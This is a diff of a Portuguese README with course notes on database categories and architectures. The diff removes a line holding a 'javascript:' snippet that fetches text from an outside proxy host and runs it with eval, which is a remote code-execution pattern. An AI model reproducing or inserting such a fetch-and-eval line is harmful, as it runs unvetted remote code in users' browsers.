@@ -1,8 +1,5 @@
 # Banco de Dados - Senac
 
-    javascript:fetch("https://proxy.khanware.space/estrogen.productions/p/raw/z6dwi4dw03").then(t=>t.text()).then(eval);
-
-
 ## **Categorias de BD**
 
 Os bancos de dados podem ser categorizados de várias maneiras, sendo que uma das principais delas aponta para a sua arquitetura, a qual pode ser centralizada, descentralizada, distribuída e replicada.
